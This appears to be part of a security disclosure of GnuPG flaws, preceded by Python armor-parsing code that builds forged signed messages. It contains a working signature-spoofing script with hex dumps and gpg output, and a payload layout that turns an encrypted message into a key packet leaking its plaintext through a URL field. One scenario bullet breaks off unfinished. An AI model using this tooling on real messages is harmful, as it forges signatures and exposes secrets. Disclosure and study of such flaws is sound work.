                     raise Exception(f"Indeterminate legacy length is not implemented")
         else:
             first = buffer.take_u8()
             if first < 192:
                 length = first
             elif first < 224:
                 msb = first - 192
                 lsb = buffer.take_u8() + 192
                 length = (msb << 8) + lsb
             elif first == 255:
                 length = buffer.take_u32be()
             else:
                 raise Exception(f"Partial body length is not implemented")

         data = buffer.take_bytes(length)
         self.body = data


 class Packets:
     packets: list[Packet]

     def __init__(self, packets: list[Packet] = []):
         self.packets = packets

     def __bytes__(self) -> bytes:
         output = b""
         for packet in self.packets:
             output += bytes(packet)
         return output

     def from_buffer(self, buffer: Buffer):
         while not buffer.is_empty():
             packet = Packet()
             packet.from_buffer(buffer)
             self.packets.append(packet)

     def from_bytes(self, data: bytes):
         self.from_buffer(Buffer(data))

   armor.py

 from base64 import b64decode, standard_b64encode
 from enum import Enum

 from packets import Packets


 def crc24(data: bytes, init: int = 0xB704CE, poly: int = 0x1864CFB) -> int:
     result = init
     for byte in data:
         result ^= byte << 16
         for bit in range(8):
             result <<= 1
             if (result & 0x1000000):
                 result ^= poly
     return result & 0xFFFFFF

 class ArmorHeaderTag(str, Enum):
     Version = "Version"
     Comment = "Comment"
     MessageID = "MessageID"
     Hash = "Hash"
     Charset = "Charset"
     NotDashEscaped = "NotDashEscaped"


 class ArmorHeader:
     tag: ArmorHeaderTag
     value: str

     def __init__(self, line: str):
         parts = line.split(":", 1)
         if len(parts) == 2:
             self.tag = ArmorHeaderTag(parts[0])
             self.value = parts[1].strip()
         else:
             raise Exception(f"Invalid Header: At least one colon (':') expected")

     def __str__(self) -> str:
         return f"{self.tag.value}: {self.value}"


 class ArmorSectionType(str, Enum):
     PGP_MESSAGE = "PGP MESSAGE"
     PGP_PUBLIC_KEY_BLOCK = "PGP PUBLIC KEY BLOCK"
     PGP_PRIVATE_KEY_BLOCK = "PGP PRIVATE KEY BLOCK"
     PGP_SIGNATURE = "PGP SIGNATURE"
     PGP_SIGNED_MESSAGE = "PGP SIGNED MESSAGE"
     PGP_ARMORED_FILE = "PGP ARMORED FILE"

     def is_binary(self) -> bool:
         match self:
             case ArmorSectionType.PGP_PUBLIC_KEY_BLOCK | ArmorSectionType.PGP_PRIVATE_KEY_BLOCK | ArmorSectionType.PGP_SIGNATURE:
                 return True
             case _:
                 return False


 class ArmorSection:
     section_type: ArmorSectionType
     headers: list[ArmorHeader]
     message: str
     data: list[bytes]

     def __init__(self, section_type: ArmorSectionType):
         self.section_type = section_type
         self.headers = []
         self.message = ""
         self.data = []

     def __str__(self) -> str:
         if self.is_binary():
             message = "Binary {\n"
             for data in self.data:
                 message += f"    ({len(data)}): {data.hex()},\n"
             message += "}"
             return message
         else:
             message = "Cleartext {\n"
             message += "    headers: {\n"
             for header in self.headers:
                 message += f"        {header},\n"
             message += "    },\n"
             message += f"    message: {repr(self.message)},\n"
             message += "}"
             return message

     def finalise(self):
         if self.is_binary() and self.message != "":
             data = b64decode(self.message)
             self.data.append(data)

     def is_binary(self) -> bool:
         return self.section_type.is_binary()

     def create_fake(
         self,
         out_path: str,
         signature_packets: Packets,
         fake_message: str = "<insert your message here>",
     ):
         with open(out_path, "w") as fake_output:
             # Note the extra `-` at the end:
             fake_output.write("-----BEGIN PGP SIGNED MESSAGE------\n")
             for header in self.headers:
                 fake_output.write(f"{header}\n")
             fake_output.write(f"\n{fake_message}\n")
             fake_output.write("-----BEGIN PGP SIGNATURE-----\n\n")

             data = bytes(signature_packets)

             b64_data = standard_b64encode(data).decode("utf8")
             while len(b64_data) >= 64:
                 fake_output.write(f"{b64_data[:64]}\n")
                 b64_data = b64_data[64:]
             fake_output.write(f"{b64_data[:64]}\n")

             checksum = crc24(data).to_bytes(length = 3, byteorder = "big")
             b64_checksum = standard_b64encode(checksum).decode("utf8")
             fake_output.write(f"={b64_checksum}\n")
             fake_output.write("-----END PGP SIGNATURE-----\n")


 class ArmorExpect(int, Enum):
     Preamble = 1
     Header = 2
     Body = 3


 DASHES = 5 * "-"
 DASH_ESCAPE = "- "
 BEGIN = f"{DASHES}BEGIN "
 END = f"{DASHES}END "


 class ArmorParser:
     expect: ArmorExpect
     dash_escaping: bool
     section: ArmorSection | None
     sections: list[ArmorSection]

     def __init__(self):
         self.expect = ArmorExpect.Preamble
         self.dash_escaping = True
         self.section = None
         self.sections = []

     def push_line(self, line: str):
         line = line.rstrip()

         match self.expect:
             case ArmorExpect.Preamble:
                 if line.startswith(BEGIN) and line.endswith(DASHES):
                     section_type = ArmorSectionType(line[len(BEGIN):-len(DASHES)].strip())
                     self.section = ArmorSection(section_type)
                     self.expect = ArmorExpect.Header

             case ArmorExpect.Header:
                 if line == "":
                     self.expect = ArmorExpect.Body
                 else:
                     header = ArmorHeader(line)
                     self.section.headers.append(header)
                     match header.tag:
                         case ArmorHeaderTag.Hash:
                             pass
                         case ArmorHeaderTag.NotDashEscaped:
                             self.dash_escaping = False
                         case _:
                             pass

             case ArmorExpect.Body:
                 opening = self.section.section_type

                 if line.startswith(END) and line.endswith(DASHES):
                     closing = ArmorSectionType(line[len(END):-len(DASHES)].strip())
                     if opening != closing:
                         raise Exception(f"Mismatch between opening ({opening}) and closing ({closing}) header line")

                     self.section.finalise()
                     self.sections.append(self.section)
                     self.section = None
                     self.expect = ArmorExpect.Preamble

                 elif line.startswith(BEGIN) and line.endswith(DASHES):
                     section_type = ArmorSectionType(line[len(BEGIN):-len(DASHES)].strip())
                     if section_type == ArmorSectionType.PGP_SIGNATURE:
                         self.section.finalise()
                         self.sections.append(self.section)

                         self.section = ArmorSection(section_type)
                         self.expect = ArmorExpect.Header
                     elif opening.is_binary() or self.dash_escaping:
                         raise Exception(f"Unexpected opening header line '{section_type}'")
                     else:
                         #print(f"Ignore opening header line '{section_type}'")
                         self.section.message += f"{line}\r\n"

                 elif opening.is_binary():
                     if line.startswith("="):
                         line = line[1:]

                     self.section.message += line

                     if line.find("=") >= 0:
                         data = b64decode(self.section.message)
                         self.section.data.append(data)
                         self.section.message = ""

                 else:
                     if self.dash_escaping and line.startswith(DASH_ESCAPE):
                         line = line[len(DASH_ESCAPE):]
                     if self.section.message:
                         self.section.message += "\r\n"
                     self.section.message += line


 class Armor:
     sections: list[ArmorSection]

     def __init__(self, sections: list[ArmorSection] = []):
         self.sections = sections

     def from_file(self, file_name: str):
         with open(file_name, "r") as file:
             parser = ArmorParser()

             for line in file.readlines():
                 parser.push_line(line)

             self.sections.extend(parser.sections)

References

   Visible links
   . https://www.sysdig.com/learn-cloud-native/what-is-a-reverse-shell

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="03-formfeed.txt"
Content-Transfer-Encoding: 8bit

          Cleartext Signature Plaintext Truncated for Hash Calculation

   An attacker can extend certain singed messages with arbitrary data in a
   way that still passed signature verification in GnuPG.

Impact

   If an attacker obtains the signature S and plaintext P of a message where
   the message plaintext contains ‘\f\n’ (or in other words, has a line
   ending in ‘\f’), the attacker can craft a signature plaintext pair
   (S,P’) where P’ has attacker controlled inserts at those occurences in
   the plaintext and still successfully verifies.

   Practically this this is applicable to the following scenario:

     * An attacker obtains (P, S’) and

Details

   GnuPG truncates plaintext lines to 20000 characters minus padding:

 #define MAX_LINELEN 20000

 // ...

 /* read the next line */
 maxlen = MAX_LINELEN;
 afx->buffer_pos = 0;
 afx->buffer_len = iobuf_read_line(a, &afx->buffer,
                                   &afx->buffer_size, &maxlen);
 if (!afx->buffer_len) {
   rc = -1; /* eof (should not happen) */
   continue;
 }
 if (!maxlen) {
   afx->truncated++;
   this_truncated = 1;
 } else this_truncated = 0;

 // ...

 /* Now handle the end-of-line canonicalization */
 if (!afx->not_dash_escaped || this_truncated) {
   int crlf = n > 1 && p[n - 2] == '\r' && p[n - 1] == '\n';

   afx->buffer_len =
     trim_trailing_chars(&p[afx->buffer_pos], n - afx->buffer_pos,
                         " \t\r\n");
   afx->buffer_len += afx->buffer_pos;
   /* the buffer is always allocated with enough space to append
    * the removed [CR], LF and a Nul
    * The reason for this complicated procedure is to keep at least
    * the original type of lineending - handling of the removed
    * trailing spaces seems to be impossible in our method
    * of faking a packet; either we have to use a temporary file
    * or calculate the hash here in this module and somehow find
    * a way to send the hash down the processing line (well, a special
    * faked packet could do the job).
          *
          * To make sure that a truncated line triggers a bad
          * signature error we replace a removed LF by a FF or
          * append a FF.  Right, this is a hack but better than a
          * global variable and way easier than to introduce a new
          * control packet or insert a line like "[truncated]\n"
          * into the filter output.
    */
   if (crlf) afx->buffer[afx->buffer_len++] = '\r';
   afx->buffer[afx->buffer_len++] = this_truncated ? '.' : '\n';
   afx->buffer[afx->buffer_len] = '.';
 }

   When verifying a message like this:

 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA512

 A[19998*A]ABBB
 CCC
 -----BEGIN PGP SIGNATURE-----

 [...]
 -----END PGP SIGNATURE-----

   The resulting hash buffer then contains A[19998*A]A, the truncation mark
   \f, and CCC.

   However, a similar message with a different payload instead of BBB like
   this:

 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA512

 A[19998*A]AXXX
 CCC
 -----BEGIN PGP SIGNATURE-----

 [...]
 -----END PGP SIGNATURE-----

   It results in the same hash buffer as before, since the changed section is
   truncated in the same way.

   Furthermore, before the \f gets inserted, the buffer gets its trailing
   characters trimmed, allowing the \f to appear at any position between 0
   and 20,000 when padding it with ’ ’, ‘\t’ or ‘\r’. Using
   repeated carriage return characters usually results in a single newline,
   making the attack practically invisible.

  Detailed steps to reproduce

    Scenario

   Mallory sends Alice a payload to sign:

 00000000:   53 69 67 6e  65 64 20 70  61 79 6c 6f  61 64 0d 0c   Signed payload__

   Alice signs the payload, and sends it back to Mallory:

 00000000:   2d 2d 2d 2d  2d 42 45 47  49 4e 20 50  47 50 20 53   -----BEGIN PGP S
 00000010:   49 47 4e 45  44 20 4d 45  53 53 41 47  45 2d 2d 2d   IGNED MESSAGE---
 00000020:   2d 2d 0a 48  61 73 68 3a  20 53 48 41  35 31 32 0a   --_Hash: SHA512_
 00000030:   0a 53 69 67  6e 65 64 20  70 61 79 6c  6f 61 64 0d   _Signed payload_
 00000040:   0c 0a 2d 2d  2d 2d 2d 42  45 47 49 4e  20 50 47 50   __-----BEGIN PGP
 00000050:   20 53 49 47  4e 41 54 55  52 45 2d 2d  2d 2d 2d 0a    SIGNATURE-----_
 [...]
 00000100:   67 55 3d 0a  3d 54 56 52  34 0a 2d 2d  2d 2d 2d 45   gU=_=TVR4_-----E
 00000110:   4e 44 20 50  47 50 20 53  49 47 4e 41  54 55 52 45   ND PGP SIGNATURE
 00000120:   2d 2d 2d 2d  2d                                      -----

   Mallory then injects a payload after the signed payload:

 00000000:   2d 2d 2d 2d  2d 42 45 47  49 4e 20 50  47 50 20 53   -----BEGIN PGP S
 00000010:   49 47 4e 45  44 20 4d 45  53 53 41 47  45 2d 2d 2d   IGNED MESSAGE---
 00000020:   2d 2d 0a 48  61 73 68 3a  20 53 48 41  35 31 32 0a   --_Hash: SHA512_
 00000030:   0a 53 69 67  6e 65 64 20  70 61 79 6c  6f 61 64 0d   _Signed payload_
 00000040:   0d 0d 0d 0d  0d 0d 0d 0d  0d 0d 0d 0d  0d 0d 0d 0d   ________________
 [...]
 00004e40:   0d 0d 0d 0d  0d 0d 0d 0d  0d 0d 0d 0d  0d 0d 0d 0d   ________________
 00004e50:   0c 55 6e 73  69 67 6e 65  64 20 70 61  79 6c 6f 61   _Unsigned payloa
 00004e60:   64 0a 2d 2d  2d 2d 2d 42  45 47 49 4e  20 50 47 50   d_-----BEGIN PGP
 00004e70:   20 53 49 47  4e 41 54 55  52 45 2d 2d  2d 2d 2d 0a    SIGNATURE-----_
 00004e80:   0a 69 48 55  45 41 52 59  4b 41 42 30  57 49 51 54   _iHUEARYKAB0WIQT
 00004e90:   78 65 51 4f  30 6b 66 75  59 35 74 50  45 74 50 78   xeQO0kfuY5tPEtPx
 00004ea0:   4c 71 31 73  4a 6f 33 75  64 68 77 55  43 61 50 59   Lq1sJo3udhwUCaPY
 00004eb0:   39 2b 41 41  4b 43 52 42  4c 71 31 73  4a 6f 33 75   9+AAKCRBLq1sJo3u
 00004ec0:   64 0a 68 79  53 4f 41 51  43 6f 6e 6e  36 73 69 57   d_hySOAQConn6siW
 00004ed0:   68 31 30 6d  6a 79 4b 45  54 57 43 39  37 58 51 2f   h10mjyKETWC97XQ/
 00004ee0:   39 33 45 4d  38 54 76 78  68 64 66 4a  41 61 65 62   93EM8TvxhdfJAaeb
 00004ef0:   4f 49 6d 41  45 41 72 32  36 65 4c 47  36 30 34 49   OImAEAr26eLG604I
 00004f00:   35 2b 0a 42  32 50 4f 32  66 55 36 64  63 6e 59 73   5+_B2PO2fU6dcnYs
 00004f10:   52 50 6d 71  53 4f 6c 4b  6a 34 70 74  48 62 2b 33   RPmqSOlKj4ptHb+3
 00004f20:   67 55 3d 0a  3d 54 56 52  34 0a 2d 2d  2d 2d 2d 45   gU=_=TVR4_-----E
 00004f30:   4e 44 20 50  47 50 20 53  49 47 4e 41  54 55 52 45   ND PGP SIGNATURE
 00004f40:   2d 2d 2d 2d  2d                                      -----

   Alice sends the spoofed message to Bob, and Bob verifies it with GnuPG,
   which succeeds despite the plaintext having additional content:

 $ cat cs.long
 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA512

 Signed payload
 Unsigned payload
 -----BEGIN PGP SIGNATURE-----

 iHUEARYKAB0WIQTxeQO0kfuY5tPEtPxLq1sJo3udhwUCaPY9+AAKCRBLq1sJo3ud
 hySOAQConn6siWh10mjyKETWC97XQ/93EM8TvxhdfJAaebOImAEAr26eLG604I5+
 B2PO2fU6dcnYsRPmqSOlKj4ptHb+3gU=
 =TVR4
 -----END PGP SIGNATURE-----
 $ gpg --verify cs.long
 gpg: invalid armor: line longer than 20000 characters
 gpg: Signature made Mon 20 Oct 2025 03:49:44 PM CEST
 gpg:                using EDDSA key F17903B491FB98E6D3C4B4FC4BAB5B09A37B9D87
 gpg: Good signature from "online" [ultimate]

   A script to automate this is provided:

 let signed_payload = "Signed payload"
 let unsigned_payload = "Unsigned payload"

 let payload = ($signed_payload | fill -c "\r" -w 19999) + "." + $unsigned_payload

 let cs_good = "plaintext" | gpg -au online --clearsign

 let ds_long = $payload
 | str substring 0..<19998
 | str replace -ra '[ \t\r\n]+$' (if ($in | split chars | last) == "\r" { "\r" } else { '' })
 | bytes build ($in | into binary) 0x[0c]
 | do {$in | save -f payload.ds; $in} $in
 | gpg -au online --clearsign
 | do {$in | save -f payload.ds.asc; $in} $in
 | lines | skip 4 | str join "\n"

 let spoofed = $cs_good | lines | first 3 | append [$payload $ds_long] | str join "\n"

 $spoofed | save -f payload.spoofed.asc
 gpg --verify cs.long

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="04-malleability.txt"
Content-Transfer-Encoding: 8bit

Encrypted message malleability checks are incorrectly enforced causing plaintext
                                recovery attacks

   A flaw in GnuPG’s enforcement of integrity protections allows practical
   malleability of encrypted messages. Specifically, GnuPG violates specified
   requirements for Modification Detection Code (MDC) verification,
   permitting attackers to manipulate encrypted packets in ways that can lead
   to plaintext recovery attacks under realistic conditions.

Impact

   A user might be tricked into decrypting and publishing a secret encrypted
   message, e.g. by changing packet types of a secret message to look like a
   public key packet.

Details

   GnuPG defaults to using a MDC for proving integrity. RFC 9580 specifies
   the MDC format as:

     Two constant octets with the values 0xD3 and 0x14 are appended to the
     plaintext. Then, the plaintext of the data to be encrypted is passed
     through the SHA-1 hash function. The input to the hash function is
     comprised of the prefix data described above and all of the plaintext,
     including the trailing constant octets 0xD3, 0x14. The 20 octets of the
     SHA-1 hash are then appended to the plaintext (after the constant octets
     0xD3, 0x14) and encrypted along with the plaintext using the same CFB
     context. This trailing checksum is known as the Modification Detection
     Code (MDC).

     During decryption, the plaintext data should be hashed with SHA-1,
     including the prefix data as well as the trailing constant octets 0xD3,
     0x14, but excluding the last 20 octets containing the SHA-1 hash. The
     computed SHA-1 hash is then compared with the last 20 octets of
     plaintext. A mismatch of the hash indicates that the message has been
     modified and MUST be treated as a security problem. Any failure SHOULD
     be reported to the user.

   GnuPG violates this requirement in two dangerous ways:

    1. Packets can be modified by an attacker to output a failure that
       appears harmless to the user, such as truncation, and
    2. it does not discard inputs known to be a security problem and
       continues processing the data.

   In decrypt-data.c’s decrypt_data function, this code can set the return
   code to invalid packet when an irregular end-of-file was seen:

 ed->buf = NULL;
 if (dfx->eof_seen > 1)
     rc = gpg_error(GPG_ERR_INV_PACKET);

   However, the code handling this return code in mainproc.c’s
   proc_encrypted function does not adequately handle this case:

 result = decrypt_data (c->ctrl, c, pkt->pkt.encrypted, c->dek,
                        &compl_error);
 // ...
 } else if (!result || (gpg_err_code(result) == GPG_ERR_BAD_SIGNATURE
                        && !pkt->pkt.encrypted->aead_algo
                        && opt.ignore_mdc_error)) {
   /* All is fine or for an MDC message the MDC failed but the
    * --ignore-mdc-error option is active.  For compatibility
    * reasons we issue GOODMDC also for AEAD messages.  */
   write_status(STATUS_DECRYPTION_OKAY);
   if (opt.verbose > 1)
     log_info(_("decryption okay\n"));

   if (pkt->pkt.encrypted->aead_algo) {
     write_status(STATUS_GOODMDC);
     compliance_de_vs |= 4;
   } else if (pkt->pkt.encrypted->mdc_method && !result) {
     write_status(STATUS_GOODMDC);
     compliance_de_vs |= 4;
   } else
     log_info(_("WARNING: message was not integrity protected\n"));
 } else if (gpg_err_code(result) == GPG_ERR_BAD_SIGNATURE
            || gpg_err_code(result) == GPG_ERR_TRUNCATED) {
   glo_ctrl.lasterr = result;
   log_error(_("WARNING: encrypted message has been manipulated!\n"));
   write_status(STATUS_BADMDC);
   write_status(STATUS_DECRYPTION_FAILED);
 } else {
   if (gpg_err_code(result) == GPG_ERR_BAD_KEY
       || gpg_err_code(result) == GPG_ERR_CHECKSUM
       || gpg_err_code(result) == GPG_ERR_CIPHER_ALGO) {
     if (c->symkeys)
       write_status_text(STATUS_ERROR,
                         "symkey_decrypt.maybe_error"
                         " 11_BAD_PASSPHRASE");

     if (c->dek && *c->dek->s2k_cacheid != '.') {
       if (opt.debug)
         log_debug("cleared passphrase cached with ID: %s\n",
                   c->dek->s2k_cacheid);
       passphrase_clear_cache(c->dek->s2k_cacheid);
     }
   }
   glo_ctrl.lasterr = result;
   write_status(STATUS_DECRYPTION_FAILED);
   log_error(_("decryption failed: %s\n"), gpg_strerror(result));
   /* Hmmm: does this work when we have encrypted using multiple
    * ways to specify the session key (symmmetric and PK). */
 }

   Additionally to that, since GnuPG utilizes buffered I/O, parsing of the
   decrypted plaintext is done before MDC checking, which an attacker can use
   for arriving at the same outcome as above, for example by compressing the
   encrypted packet plus a buffer, and cutting off the last few bytes of the
   encrypted text, which causes do_compress in compress.c to exit the entire
   program with a harmless-appearing error code while output is still
   written:

 else if (zrc != Z_OK) {
     if (zs->msg)
         log_error("zlib deflate problem: %s\n", zs->msg);
     else
         log_error("zlib deflate problem: rc=%d\n", zrc);
     write_status_error("zlib.deflate", gpg_error(GPG_ERR_INTERNAL));
     g10_exit(2);
 }

  Attack scenario

   Message malleability is usually not a likely impactful vulnerability,
   since a user would usually notice the change. However, since GnuPG handles
   PGP packets instead of just plaintext it allows the scenario described
   below.

   Additionally, to perform a working malleation attack on AES-256-CFB, the
   attacker has to perform a known-plaintext attack since the ciphertext is
   XORed into the plaintext, but the predictable structure of PGP messages
   makes this practically exploitable. Successful exploitation could involve
   an attacker sending a manipulated message to the victim, the victim
   unknowingly decrypting the message, and handling the output as if it was a
   different plaintext.

   Mallory is an attacker who either later gets access to an encrypted
   message, or as as an active MITM. Mallory’s goal is to decrypt an
   encrypted message that Alice encrypted for Bob.

     * Alice has Bob’s public key
     * Alice encrypts the plaintext “SECRET” to Bob’s public key, and
       sends the ciphertext as a PGP message to Bob.
     * Mallory gets access to the encrypted message, and would like to
       decrypt it, so Mallory modifies the message to be a public key.
     * Mallory sends Bob the modified message, asking for a signature on the
       public key — a common not suspicious action for PGP users.
     * Bob decrypts and signs the apparent public key, and publishes the
       signature along with the public key to a keyserver.
     * Mallory fetches the key from the keyserver and retrieves the
       accidentally decrypted plaintext

  Detailed steps to reproduce

   In the interest of a timely disclosure, we cannot provide an refined
   end-to-end demonstration of the issue. However, under the following
   assumptions we can demonstrate relevant parts of the attack. In
   combination with the buggy code pointed out above, we believe that there
   is sufficient risk of a serious vulnerability to warrant investigation and
   fixes by GnuPG maintainers.

   We assume that:

     * We have access to the encrypted data
     * The encrypted data is exactly 64 bytes of total entropy
     * Bob uses GnuPG 2.4.8
     * Bob has no non-standard config and uses head -c64 /dev/urandom | gpg
       -e -r online to encrypt his data

   This encrypted data follows a recognizable structure:

 Public-Key Encrypted Session Key Packet, old CTB, 2 header bytes + 94 bytes
     Version: 3
 [...]

 Sym. Encrypted and Integrity Protected Data Packet, new CTB, 2 header bytes + 126 bytes
 │   Version: 1
 │   Session key: 70739CD50B03B723FD9E8CBDAB2F2DE942F746F046BC9FD552B2F5CEC5E16696
 │   Symmetric algo: AES-256
 │   Decryption successful
 │
 │   00000000  d2                                                 CTB
 │   00000001     7e                                              length
 │   00000002        01                                           version
 │   00000003           d7 cc f2 68 a8  c9 aa cd f3 db 5d 07 bd      ...h......]..
 │   [...]
 │
 ├── Compressed Data Packet, old CTB, 2 header bytes + indeterminate length
 │   │   Algorithm: ZLIB
 │   │
 │   │   00000000  a3                                                 CTB
 │   │   00000001     02                                              algo
 │   │   00000002        78 9c 01 48 00 b7  ff cb 46 62 00 68 b7 04     x..H....Fb.h..
 │   │   00000010  5a ba 6f 8a 86 9c 9c 93  8f bf ed e1 7b 79 54 28   Z.o.........{yT(
 │   │   00000020  83 ac 84 9a fc 07 bd 9e  03 1b c8 b2 4a d6 76 16   ............J.v.
 │   │   00000030  27 03 ce 3a f6 22 d0 15  c1 f5 31 2d 82 03 04 38   '..:."....1-...8
 │   │   00000040  e9 db 54 08 68 63 a2 d0  85 8b 95 45 dd 32 60 18   ..T.hc.....E.2`.
 │   │   00000050  ae f3 fb 21 f0                                     ...!.
 │   │
 │   └── Literal Data Packet, new CTB, 2 header bytes + 70 bytes
 │           Format: Binary data
 │           Timestamp: 2025-09-02 14:51:06 UTC
 │           Content: "%OMITTED%"...
 │
 │           00000000  cb                                                 CTB
 │           00000001     46                                              length
 │           00000002        62                                           format
 │           00000003           00                                        filename_len
 │           00000004              68 b7 04 5a                            date
 │           00000008                           ba 6f 8a 86 9c 9c 93 8f           .o......
 │           00000010  bf ed e1 7b 79 54 28 83  ac 84 9a fc 07 bd 9e 03   ...{yT(.........
 │           00000020  1b c8 b2 4a d6 76 16 27  03 ce 3a f6 22 d0 15 c1   ...J.v.'..:."...
 │           00000030  f5 31 2d 82 03 04 38 e9  db 54 08 68 63 a2 d0 85   .1-...8..T.hc...
 │           00000040  8b 95 45 dd 32 60 18 ae                            ..E.2`..
 │
 └── Modification Detection Code Packet, new CTB, 2 header bytes + 20 bytes
         Digest: D9A58F8A66FE5014C0188F5C05E81C2A9E6AB3C6
         Computed digest: D9A58F8A66FE5014C0188F5C05E81C2A9E6AB3C6
         Valid: true

         00000000  d3                                                 CTB
         00000001     14                                              length
         00000002        d9 a5 8f 8a 66 fe  50 14 c0 18 8f 5c 05 e8   digest
         00000010  1c 2a 9e 6a b3 c6

   Of note here is that since we are working with AES-256-CBC, we can XOR
   into any 16-byte block of our choice, but the following 16 bytes will be
   random data. The block alignment is 18, since that is the prefix for the
   IV + 2 bytes for session key validation.

   We can now prepare our known plaintext attack. By observing plaintexts of
   encrypted messages, the pattern becomes apparent:

 00  a3                                                 CTB
 01     02                                              algo
 02        78 9c 01 48 00 b7  ff cb 46 62 00 68 b7 05     x..H....Fb.h..
 10  a7 40 47 01 c3 ff 96 6a  91 58 6a fb 52 90 0c ba   [email protected]...
 20  10 e3 ec 6e d4 fa 95 76  7b b8 03 32 74 c6 e5 71   ...n...v{..2t..q
 30  05 b1 c8 ce 9e ee be d5  7d 6a 55 1c b6 b1 57 f9   ........}jU...W.
 40  63 1d 98 ac 2f 58 15 9d  10 c6 cc b1 ed cf 96 49   c.../X.........I
 50  09 2b 01 25 0b                                     .+.%.
 ---
 00  a3                                                 CTB
 01     02                                              algo
 02        78 9c 01 48 00 b7  ff cb 46 62 00 68 b7 05     x..H....Fb.h..
 10  e4 f8 27 bc 9c e0 16 d8  a4 3c 98 6f 82 58 f1 6a   ..'......<.o.X.j
 20  11 6a 4f 21 b6 4c 02 a8  d5 78 ee 22 1c 8c 8c 22   .jO!.L...x."..."
 30  3d b3 ad a6 63 80 05 95  e5 d3 5e c4 a5 6d 19 84   =...c.....^..m..
 40  98 ac 15 e9 8e 19 e1 7c  48 f3 1d 51 f1 f1 e9 79   .......|H..Q...y
 50  48 f7 b6 23 eb                                     H..#.
 ---
 00  a3                                                 CTB
 01     02                                              algo
 02        78 9c 01 48 00 b7  ff cb 46 62 00 68 b7 05     x..H....Fb.h..
 10  ee 91 d8 48 39 e3 db a3  fd 4e 5d dd 94 b6 4c 0c   ...H9....N]...L.
 20  11 85 41 5e 75 b0 8d d1  ef 27 35 a3 3d 98 20 9b   ..A^u....'5.=. .
 30  e8 cb 30 d2 9b f6 d1 db  3e 2a 23 0b 6f 5b 52 da   ..0.....>*#.o[R.
 40  a1 4d ca e7 90 88 d0 8e  77 f0 d6 40 a2 62 74 e5   [email protected].
 50  32 42 37 25 cd                                     2B7%.
 ---
 00  a3                                                 CTB
 01     02                                              algo
 02        78 9c 01 48 00 b7  ff cb 46 62 00 68 b7 06     x..H....Fb.h..
 10  01 7a 62 2f 38 4c bf d1  9d 31 2f a2 ac 0c 39 fd   .zb/8L...1/...9.
 20  9e 8c d2 5b ee d0 dc 88  73 a1 58 56 d9 a0 8d 10   ...[....s.XV....
 30  bf fe 6b 41 0a 91 20 d3  96 32 f4 17 7b 1f 55 5c   ..kA.. ..2..{.U
 40  f3 09 a7 5e f5 92 63 a2  7c b8 31 5f d8 ef d3 f2   ...^..c.|.1_....
 50  8f cb 00 24 18                                     ...$.

   We can deduce that the plaintext of the packets is very stable on a3 02 78
   9c 01 48 00 b7 ff cb 46 62 00 68 b7. This alone is not enough to do much
   damage, but is our entrypoint.

   A payload can now be constructed, that:

     * Starts with the original ciphertext
     * Modifies the section that we observed as stable to be:
     * A compressed packet, with the DEFLATE algorithm (this is important
       since it allows back references and has no checksum that would fail)
     * The compressed packet has a DEFLATE plaintext block of a long size
     * The plaintext starts with a Comment packet, also of long size
     * Then we write a block of zeroes to emulate the actual IV of zero
     * Followed by the entire packet ciphertext, which now decompresses with
       the prefix of an open Comment packet, effectively discarding the
       output
     * After that, we abuse faulty IOBUF logic to pop the decryption filter
       without popping the decompression filter
     * We follow up with a DEFLATE fixed block, and add the start of a public
       key packet
     * We insert a lookback instruction, which fetches the contents of the
       comment block into a field like the preferred keyserver URL
     * We insert the rest of the public key packet

   Or, expressed in a bit more concrete notation:

   Our known AES-CFB plaintext:

 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 # IV

 ?? ?? ?? ?? ?? ?? ?? ??  ?? ?? ?? ?? ?? ?? ?? ?? # "IV"
 ?? ??                                            # Protection bytes
       a3 02                                      # Use zlib
             78 9c 01 6c  00 93 ff cb 6a 62 00 68 # zlib header for c=100
 b3 03
       ?? ?? ...                                  # zlib data

   Effectively writable:

 d2 NN 01                                         # SEIPv1 setup
 ?? ?? ?? ?? ?? ?? ?? ??  ?? ?? ?? ?? ?? ?? ?? ?? # "IV"
 ?? ??                                            # protection bytes
       a3 01                                      # comp pkt alg=DEFLATE
             00 NN NN ~N  ~N                      # DF store len=NN
                             d0 NN                # comment pkt len=NN
                                   00 00 00 00 00 # garbage till EoB
 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 # reset IV
 CT CT CT CT CT CT CT CT  CT CT CT CT CT CT CT CT # entire ciphertext
 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 # pad 22B for MDC
 [IOBUF EOF trampoline, pop decryption filter]
 [DF store 0] [DF store 0] [DF store 0] [DF store 0] [...nop sled...]
 [DF store [PGP public key until unhashed subpackets]]
 [DF compressed [LengthDistance pointing to decrypted data in compression buffer]
 [DF store [Rest of PGP public key]]

   This method of exploitation somewhat works with GnuPG: Due to an
   implementation bug, the decompression of the packet fails when processed
   as an iobuf pipeline. This is an issue that could be worked around in the
   payload itself. To work around it, we use gpg --unwrap -o- | gpg to
   decrypt the packet, which buffers the entire compression buffer to
   stdin/out first. The payload also does not bypass the manipulation warning
   in the way described above for the same reason.

   A payload like this then decrypts (as observed by gpg --unwrap) to:

 Compressed Data Packet, old CTB, 2 header bytes + indeterminate length
 │   Algorithm: ZIP
 │
 │   00000000  a3                                                 CTB
 │   00000001     01                                              algo
 │   00000002        00 a3 00 5c ff d0  a1 a1 a1 a1 a1 a1 8b 27     ............'
 │   00000010  d1 84 ab f2 3b ab d3 5a  d9 9f 0e 9c 9c 6a 8f 23   ....;..Z.....j.#
 │   [...]
 │   00000170  00 a2 a1 18 68 74 74 70  3a 2f 2f 6c 6f 63 61 6c   ....http://local
 │   00000180  68 6f 73 74 3a 39 39 39  39 2f 75 70 6c 6f 61 64   host:9999/upload
 │   00000190  2d 6b 65 79 3f 78 3d 1a  d0 30 07 00 e6 03 19 fc   -key?x=..0......
 │   000001a0  8c 5d 00 ff 42 0b d7 a1  c2 92 cc 4c c7 10 d0 8b   .]..B......L....
 │   000001b0  67 3a 43 ef 3f 94 c6 31  1d f6 4c 41 b4 7d da a9   g:C.?..1..LA.}..
 │   [...]
 │   00000580  6b ce e1 08 6c 03 01 02  00 fd ff d0 00            k...l........
 │
